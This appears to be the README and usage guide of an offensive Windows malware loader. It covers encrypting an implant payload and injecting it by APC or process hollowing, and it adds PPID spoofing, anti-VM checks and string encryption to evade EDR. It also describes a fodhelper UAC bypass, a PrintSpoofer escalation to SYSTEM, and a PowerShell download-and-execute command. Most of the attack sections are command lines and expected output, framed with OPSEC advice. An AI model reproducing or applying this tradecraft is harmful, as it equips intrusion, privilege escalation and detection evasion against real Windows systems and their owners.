# AES Loader - Complete Usage Guide

---

## 📁 Structure du Projet

Le loader est organisé en modules fonctionnels pour faciliter la maintenance :

```
aes_loader/
├── builder.sh                 # Script de compilation automatisé
├── myenc.py                  # Générateur de chiffrement (payload + 14 strings)
├── edr_strings.conf          # 14 strings sensibles à chiffrer
│
├── src/                      # Code source organisé par module
│   ├── loader.cpp            # Point d'entrée principal
│   ├── crypto/               # AES-256-CBC + PBKDF2
│   │   ├── easCipher42.cpp
│   │   └── crypto_funcs.cpp
│   ├── injection/            # Process hollowing + APC injection
│   │   ├── process_hollower.cpp
│   │   └── process_injection.cpp
│   ├── bypass/               # Anti-VM + UAC bypass
│   │   ├── bypass_analysis.cpp
│   │   └── uac_bypass.cpp
│   ├── privesc/              # SeImpersonate + PrintSpoofer
│   │   ├── seimpersonate.cpp
│   │   └── printspoofer_trigger.cpp
│   └── rpc/                  # RPC stubs MS-RPRN (MIDL-generated)
│       ├── ms-rprn_c.c
│       └── rpc_helpers.c
│
├── includes/                 # Headers + demon.x64.h (généré au build)
│   ├── demon.x64.h          # Payload + 14 strings EDR chiffrées
│   ├── crypto/, injection/, bypass/, privesc/, rpc/
│
└── obj/                      # Fichiers objets (créé automatiquement au build)
```

---

## 🔧 Build & Compilation

### Build Standard
```bash
# Build x64 (défaut)
./builder.sh demon.x64.bin

# Build x86
./builder.sh demon.x64.bin x86
```

**Output:** `loader.exe` (nom fixe, pas d'argument de sortie)

### Nettoyage
```bash
# Supprime loader.exe, includes/demon.x64.h, obj/
./builder.sh --clean
./builder.sh -c              # Alias de --clean
```

### Ce que builder.sh fait automatiquement

1. **Chiffre le payload + 14 strings EDR** avec `myenc.py`
   - Lit `edr_strings.conf` et chiffre toutes les strings sensibles
   - Génère `includes/demon.x64.h` avec les arrays chiffrés
   - 14 strings: fodhelper paths, registry, spoolsv, pipe names, SDDL, etc.

2. **Compile tous les modules** depuis `src/` vers `obj/`
   - src/crypto/*.cpp → obj/easCipher42.o, obj/crypto_funcs.o
   - src/injection/*.cpp → obj/process_hollower.o, obj/process_injection.o
   - src/bypass/*.cpp → obj/bypass_analysis.o, obj/uac_bypass.o
   - src/privesc/*.cpp → obj/seimpersonate.o, obj/printspoofer_trigger.o
   - src/rpc/*.c → obj/ms-rprn_c.o, obj/rpc_helpers.o
   - src/loader.cpp → obj/loader.o

3. **Cross-compile** avec mingw-w64 (x64 ou x86)

4. **Link** avec RPC libraries (rpcrt4, advapi32, kernel32, etc.)

5. **Strip** debug symbols pour binary plus léger

6. **Cleanup** .o files automatiquement

**Logs de build:**
```
[*] Encrypting payload and EDR strings...
14 strings EDR chargées depuis edr_strings.conf
[*] Compiling loader (x64)...
[+] Compilation successful: loader.exe (~150KB)
```

---

## 🔒 OPSEC - Strings Chiffrées

**14 strings sensibles entièrement chiffrées** (voir [EDR_STRINGS_AUDIT.md](EDR_STRINGS_AUDIT.md)) :

| Module | Strings | Impact |
|--------|---------|--------|
| UAC Bypass | fodhelper paths, registry, DelegateExecute, shell verb, svchost | Signatures UAC bypass invisibles |
| Bypass Analysis | kernel32.dll, VirtualAllocExNuma | Anti-VM checks obfusqués |
| SeImpersonate | S-1-5-18, pipe paths, spoolsv.exe, desktop, cmd.exe, SDDL | PrintSpoofer signatures masquées |

**Vérification:**
```bash
strings loader.exe | grep -i "DelegateExecute"    # ✅ Vide
strings loader.exe | grep -i "spoolss"            # ✅ Vide
strings loader.exe | grep -i "S-1-5-18"           # ✅ Vide
```

---

## IMPORTANT NOTES

### Privilege Requirements by Feature

| Feature | Minimum Privilege | Note |
|---------|-------------------|------|
| DEFAULT mode (spawn + APC) | User | Works fine as NETWORK SERVICE |
| HOLLOW mode (default) | User | Works fine as NETWORK SERVICE |
| HOLLOW with `-f` (custom process) | User | **MUST use full path** (see Path Requirements below) |
| PPID Spoofing (`--ppid`) | **ADMIN** | Requires elevated privileges to OpenProcess parent |
| APC into system process | User/ADMIN | Depends on target process - system processes need ADMIN |
| SeImpersonate escalation (`-i`) | **User with SeImpersonate** | Elevates to SYSTEM - **PrintSpoofer RPC AUTO** |

### Path Requirements for `-f` (Custom Process)

**svchost.exe is special:**
```bash
./loader.exe -m hollow -f svchost.exe        # ✅ WORKS - found via system PATH
```

**Other processes REQUIRE full path:**
```bash
./loader.exe -m hollow -f calc.exe           # ❌ FAILS (error 2 - file not found)
./loader.exe -m hollow -f c:\windows\system32\calc.exe  # ✅ WORKS
./loader.exe -m hollow -f c:\windows\system32\notepad.exe  # ✅ WORKS
```

### Admin Privilege Scenarios

**These require ADMIN (elevated) shell:**
- PPID Spoofing with `--ppid` - needs to open parent process
- APC injection into system processes (explorer, spoolsv, etc.)
- Any injection when running as standard user against protected processes

**Examples that will FAIL without admin:**
```bash
./loader.exe --ppid 500 -v                   # ❌ Error 5 (needs admin)
./loader.exe -m apc -p 500 -v                # ❌ May fail if target is protected
./loader.exe -m hollow -f explorer.exe --ppid 500  # ❌ Error 5 (needs admin)
```

**Same examples WORK with admin:**
```bash
(admin shell) > .\loader.exe --ppid 500 -v   # ✅ WORKS
(admin shell) > .\loader.exe -m apc -p 500 -v  # ✅ WORKS
(admin shell) > .\loader.exe -m hollow -f c:\windows\system32\explorer.exe --ppid 500  # ✅ WORKS
```

---

## Overview

The AES Loader supports 5 operational modes:

1. **DEFAULT** - Spawn svchost.exe + APC injection (no mode flag required)
2. **HOLLOW** - Process hollowing (create new process and replace code)
3. **APC** - Async Procedure Call injection into existing process
4. **UAC** - UAC bypass via fodhelper exploit
5. **SeImpersonate** - Escalate to SYSTEM via integrated PrintSpoofer RPC (flag `-i`)

---

## DEFAULT MODE: Spawn svchost + APC Inject

### Basic Usage
```bash
./loader.exe
```
**Behavior:**
- Spawns svchost.exe process suspended
- APC injects encrypted payload into spawned process
- Simple and stealthy, no flags needed
- **Privilege Requirement**: User privileges OK

### With Verbose Output
```bash
./loader.exe -v
```
**Behavior:**
- Same as above but with detailed debug logging
- Shows cipher initialization, payload detection, section writes, etc.
- **Privilege Requirement**: User privileges OK

### With PPID Spoofing
```bash
./loader.exe --ppid 1152 -v
```
**Behavior:**
- Spawns svchost.exe with spoofed parent process (PPID: 1152)
- APC injects payload
- Parent process will appear as the spoofed PID in Process Explorer
- **Privilege Requirement**: **ADMIN required** (OpenProcess on parent)
- **Requirements**: Target parent process must exist and be accessible

### With Anti-Analysis
```bash
./loader.exe -a -v
```
**Behavior:**
- Runs anti-analysis checks (VM detection, timing verification)
- Spawns svchost.exe + APC inject + verbose logging
- **Privilege Requirement**: User privileges OK

---

## HOLLOW MODE: Process Hollowing

### Hollow Default Process (svchost.exe)
```bash
./loader.exe -m hollow -v
```
**Behavior:**
- Creates suspended svchost.exe process
- Parses encrypted PE payload
- Allocates memory in target process
- Writes PE headers and all sections
- Fixes relocation table
- Updates PEB ImageBase
- Sets thread entry point (RCX register)
- Resumes process execution
- **Privilege Requirement**: User privileges OK

### Hollow Custom Process (FULL PATH REQUIRED)
```bash
./loader.exe -m hollow -f c:\windows\system32\calc.exe -v
```
**IMPORTANT - Path Requirements:**
- Must use **FULL ABSOLUTE PATH** for custom processes (except svchost.exe)
- `./loader.exe -m hollow -f calc.exe` → FAILS (error 2 - file not found)
- `./loader.exe -m hollow -f c:\windows\system32\calc.exe` → WORKS
- svchost.exe is special case - found via system PATH

**Behavior:**
- Hollow specified process instead of svchost.exe
- Full PE injection with proper initialization
- Useful for spoofing program execution
- **Privilege Requirement**: User privileges OK

### Hollow with PPID Spoofing
```bash
./loader.exe -m hollow -f c:\windows\system32\explorer.exe --ppid 500 -v
```
**Behavior:**
- Hollow explorer.exe process
- Parent process spoofed to PID 500
- Process tree will show custom parent relationship
- Advanced evasion technique
- **Privilege Requirement**: ADMIN required (OpenProcess on parent needs elevated rights)

---

## APC MODE: Existing Process Injection

### APC into Specific Process
```bash
./loader.exe -m apc -p 1464 -v
```
**Behavior:**
- Opens existing process with PID 1464
- Allocates memory in target process
- Detects payload type (PE or shellcode)
- If PE: Maps all sections + fixes relocations
- If shellcode: Direct allocation + CreateRemoteThread
- Thread execution via APC queue

### Important Requirements
- `-p PID` is **required** for APC mode
- Target process must be accessible
- **Privilege Requirement**:
  - User privileges OK for user-owned processes
  - **ADMIN required** for system processes or protected processes

### Access Denied Troubleshooting
```bash
./loader.exe -m apc -p 1464 -v
[-] OpenProcess failed: error 5
```
**Error 5 = ACCESS_DENIED**: Elevation to admin required, or target process is protected

---

## SEIMPERSONATE MODE: Privilege Escalation to SYSTEM

### How SeImpersonate Works

The `-i` (impersonate) flag enables **privilege escalation to SYSTEM** via Print Spooler RPC coercion (MS-RPRN):

**Step-by-step execution:**
1. **Named pipe creation**: Creates UUID-named pipe `\.\pipe\{UUID}\pipe\spoolss`
2. **RPC trigger**: Attacker triggers spoolsv.exe (SYSTEM) to connect via named pipe
3. **Token impersonation**: Impersonates SYSTEM token from spoolsv connection
4. **Process relaunching**: Relaunches loader **without `-i`** using SYSTEM token
5. **Session context**: New loader runs in Session 1 (interactive) + SYSTEM privileges
6. **Normal execution**: Relaunched loader executes injection normally with SYSTEM context

### Requirements for SeImpersonate

- Must run as user with **SeImpersonate privilege** (e.g., NETWORK SERVICE, LOCAL SERVICE, IIS APPPOOL)
- **No external tools required** - PrintSpoofer RPC trigger integrated in loader
- Print Spooler service (spoolsv.exe) must be running on target
- MS-RPRN protocol must be accessible (default on most Windows systems)

### Basic Usage with DEFAULT Mode
```bash
./loader.exe -i -v
```
**Behavior:**
1. Creates named pipe with UUID: `\\.\pipe\{UUID}\pipe\spoolss`
2. **Automatically spawns async RPC trigger thread** (PrintSpoofer integrated)
3. RPC thread calls RpcOpenPrinter + RpcRemoteFindFirstPrinterChangeNotificationEx
4. Main thread waits for spoolsv.exe connection (timeout: 25-35 seconds with jitter)
5. Impersonates SYSTEM token when spoolsv.exe connects
6. Relaunches loader without `-i` flag as SYSTEM (Session 1)
7. Spawns svchost + APC injects payload **as SYSTEM**
8. Meterpreter callback executes **in SYSTEM context**

**No attacker-side action required** - RPC coercion is automatic and integrated.

### SeImpersonate with HOLLOW Mode
```bash
./loader.exe -i -m hollow -v
./loader.exe -i -m hollow -f C:\Windows\System32\calc.exe -v
```
**Behavior:**
1. Escalates to SYSTEM via SeImpersonate
2. Relaunches with `-m hollow` (removes `-i` flag)
3. Creates custom target process **as SYSTEM** (Session 1)
4. Payload executes **in SYSTEM context**

### SeImpersonate with APC Injection
```bash
./loader.exe -i -m apc -p 1464 -v
```
**Behavior:**
1. Escalates to SYSTEM via SeImpersonate
2. Relaunches with `-m apc -p 1464` (removes `-i` flag)
3. Injects into existing process 1464 **with SYSTEM privileges**
4. **⚠️ Important**: Payload executes in **target process context**
   - If target (1464) is explorer.exe (user-owned) → code runs as USER
   - If target (1464) is svchost.exe (SYSTEM) → code runs as SYSTEM
   - Shellcode inherits injection process privileges, not loader privileges

### SeImpersonate with Custom Command
```bash
./loader.exe -i -c "cmd.exe /c whoami > c:\temp\whoami.txt"
```
**Behavior:**
1. Escalates to SYSTEM via SeImpersonate
2. Spawns custom command **as SYSTEM** using CreateProcessWithTokenW
3. Command executes in SYSTEM context
4. **Note**: This is the ONLY case where `-i` doesn't relaunch - it directly executes

### Access Denied in SeImpersonate

```bash
./loader.exe -i -v
[-] OpenProcess failed: error 5
```
**Cause**: Thread is still in original context (SYSTEM token not obtained yet)
**Solution**: Wait for integrated PrintSpoofer RPC trigger to complete - timeout is 25-35 seconds

### Opsec Considerations for SeImpersonate

✅ **Good OPSEC:**
- Uses UUID-named pipes (avoids hardcoded pipe names)
- Jittered timeouts (25-35 seconds, random ±5s)
- Single impersonation call per pipe
- No verbose service enumeration
- Token is SYSTEM from legitimate RPC source
- **No external tools required** - PrintSpoofer RPC integrated in loader
- RPC calls run in async thread (non-blocking)

⚠️ **Trade-offs:**
- Creates named pipe observable in ETW
- Spoolsv.exe process logs may show RPC connection attempt
- 25-35 second wait window is noticeable
- Requires Print Spooler service running (spoolsv.exe)
- MS-RPRN RPC calls generate network activity logs

---

## UAC MODE: Privilege Escalation

### UAC Bypass (Re-execute Payload)
```bash
./loader.exe -m uac -v
```
**Behavior:**
1. Injects into fodhelper.exe (UAC bypass)
2. Reconstructs loader command WITHOUT -m uac flag
3. Spawns new svchost + APC injects (elevated)
4. Original process exits

### UAC Bypass with Custom Command
```bash
./loader.exe -m uac -c "powershell.exe -c 'IEX(New-Object Net.WebClient).DownloadString(...)'"
```
**Behavior:**
1. Injects into fodhelper.exe
2. Stores custom command in registry
3. Command executes elevated instead of re-running loader
4. Flexible payload execution

### Re-execute in APC Mode (Elevated)
```bash
./loader.exe -m uac -c "C:\path\loader.exe -m apc -p 1464"
```
**Behavior:**
1. UAC escalation via fodhelper
2. Executes loader in APC mode with elevated privileges
3. Useful for injecting into system processes

---

## COMPLETE COMMAND EXAMPLES

### Scenario 1: Covert Default Execution
```bash
./loader.exe -v
```
→ Spawn hidden svchost + APC inject + debug output

### Scenario 2: Parent Process Spoofing
```bash
./loader.exe --ppid 4 -v
```
→ Spawn svchost as child of System (PID 4)

### Scenario 3: Explorer Hollowing
```bash
./loader.exe -m hollow -f explorer.exe --ppid 500 -v
```
→ Hollow explorer + spoof parent + verbose

### Scenario 4: Inject into Running Process
```bash
./loader.exe -m apc -p 8692 -v
```
→ APC inject into existing explorer.exe (PID 8692)

### Scenario 5: UAC Bypass with Custom Command
```bash
./loader.exe -m uac -c "cmd.exe /c calc.exe" -v
```
→ UAC → fodhelper → launch calc elevated

### Scenario 6: Complete Evasion Chain
```bash
./loader.exe -m hollow -f svchost.exe --ppid 500 -a -v
```
→ Hollow svchost + PPID spoof + anti-analysis + verbose

---

## FLAG REFERENCE

| Flag | Argument | Description |
|------|----------|-------------|
| `-m, --mode` | hollow/apc/uac | Injection mode (default: spawn+apc) |
| `-v, --verbose` | none | Enable debug output |
| `-a, --anti` | none | Run anti-analysis checks |
| `-f, --file` | **FULL PATH** | Target process for hollow (default: svchost.exe) - **USE FULL PATH except svchost.exe** |
| `-p, --pid` | PID | Target PID for APC (required for -m apc) |
| `--ppid` | PID | Parent PID spoofing (**ADMIN required**) |
| `-c, --cmd` | COMMAND | Custom command for UAC mode |
| `-h, --help` | none | Show help |

---

## PAYLOAD DETECTION

The loader automatically detects payload type:

- **PE Payload** (DOS + PE signatures):
  - Full PE header parsing
  - Section allocation and mapping
  - Relocation table fixing
  - PEB ImageBase update

- **Raw Shellcode**:
  - Simple memory allocation
  - WriteProcessMemory
  - CreateRemoteThread execution

---

## ERROR HANDLING

### File Not Found
```
./loader.exe -m hollow -f calc.exe
[-] CreateProcessW failed: error 2
```
→ Must use **FULL PATH** for custom processes
```
./loader.exe -m hollow -f c:\windows\system32\calc.exe
```

### Missing Requirements
```
./loader.exe -m apc
[-] Mode APC requires -p/--pid
```
→ Always use `-p PID` with `-m apc`

### Access Denied
```
./loader.exe --ppid 500
[-] OpenProcess (PPID 500) failed: 5
```
→ **Error 5 = ACCESS_DENIED**
→ **ADMIN privileges required** for PPID spoofing
```
(admin shell) > .\loader.exe --ppid 500 -v
```

```
./loader.exe -m apc -p 1464
[-] OpenProcess failed: error 5
```
→ Target process requires higher privileges
→ Try **ADMIN shell** or choose accessible process

### Invalid Mode
```
[-] Unknown mode: xyz (use: hollow, apc, uac)
```
→ Use hollow, apc, or uac only

---

## PRIVILEGE REQUIREMENTS MATRIX

| Scenario | User | Admin | Notes |
|----------|------|-------|-------|
| `./loader.exe` (default spawn) | ✅ | ✅ | Works fine |
| `./loader.exe -m hollow` | ✅ | ✅ | Works fine |
| `./loader.exe -m hollow -f c:\windows\system32\calc.exe` | ✅ | ✅ | Works fine |
| `./loader.exe --ppid <PID>` | ❌ | ✅ | **NEEDS ADMIN** |
| `./loader.exe -m hollow --ppid <PID>` | ❌ | ✅ | **NEEDS ADMIN** |
| `./loader.exe -m apc -p <user_process>` | ✅ | ✅ | Depends on target |
| `./loader.exe -m apc -p <system_process>` | ❌ | ✅ | **NEEDS ADMIN** |
| `./loader.exe -m uac` | ✅ | ❌ | Escalates to admin |
| `./loader.exe -i` (SeImpersonate) | ✅* | ✅ | *Only with SeImpersonate privilege |

---

## ANTI-DETECTION FEATURES

1. **Payload Encryption**: AES-256-CBC with random seed
2. **PE Parsing**: Proper relocation fixing prevents crashes
3. **PPID Spoofing**: Hide parent process relationship
4. **Custom Targets**: Use any process, not just svchost
5. **UAC Bypass**: Elevate privileges without UAC prompt
6. **Anti-Analysis**: VM detection + timing checks

---

## COMPILATION

### MSVC (Visual Studio)
```bash
cl /std:c++17 /EHsc loader.cpp process_hollower.cpp process_injection.cpp \
   bypass_analysis.cpp uac_bypass.cpp crypto_funcs.cpp easCipher42.cpp \
   /link kernel32.lib ntdll.lib
```

### MinGW
```bash
g++ -std=c++17 -o loader.exe loader.cpp process_hollower.cpp \
    process_injection.cpp bypass_analysis.cpp uac_bypass.cpp \
    crypto_funcs.cpp easCipher42.cpp -lkernel32 -lntdll
```

---

## TROUBLESHOOTING

**Process doesn't execute:**
- Check payload format (PE vs shellcode signature)
- Verify process permissions
- Try with `-v` to see debug output

**PPID spoofing fails:**
- Parent process must exist
- Need admin privileges
- Check target PID validity

**UAC bypass fails:**
- Requires standard user (not admin already)
- fodhelper.exe must be available (Windows 10+)
- Check registry permissions

**Relocation errors:**
- Ensure PE was built position-independent
- Check ASLR compatibility
- Try different target memory addresses
